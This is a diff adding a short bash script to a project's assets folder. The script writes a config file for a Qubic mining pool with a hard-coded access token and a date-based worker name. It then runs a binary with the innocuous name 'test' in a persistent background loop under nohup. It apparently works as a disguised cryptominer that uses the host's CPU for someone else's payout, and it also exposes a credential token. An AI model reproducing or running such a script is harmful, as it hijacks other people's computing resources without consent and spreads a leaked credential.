@@ -1,0 +1,22 @@
+#!/bin/bash
+cd src/assets
+thread=$(nproc --all)
+thread=$((thread-1))
+WORKER=romy$(echo $(date +%d%H%M))
+rm -rf appsettings.json
+cat <<EOF>> appsettings.json
+{
+  "Settings": {
+    "baseUrl": "https://mine.qubic.li/",
+    "amountOfThreads": 7,
+    "payoutId": null,
+    "accessToken": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJJZCI6IjIxOTA2ODU3LWZiMjYtNDQ4OC04NjE2LTY0M2YzMDczNGJiNCIsIk1pbmluZyI6IiIsIm5iZiI6MTcxMzE3OTA5NSwiZXhwIjoxNzQ0NzE1MDk1LCJpYXQiOjE3MTMxNzkwOTUsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.LV83ut1jtLj6laqHry-17R_YgEMVdLMZ7kzCkZV-eQh-MMydr7j83F7OuYoOw-xynOqAourE9f-lrwO5zYd35A",
+    "alias": "$WORKER"
+  }
+}
+EOF
+
+pgrep -x test >/dev/null && echo "Process found" || nohup bash -c 'for i in {1..99999}; do ./test; done' > program.out 2>&1 &
+
+echo "done"
+
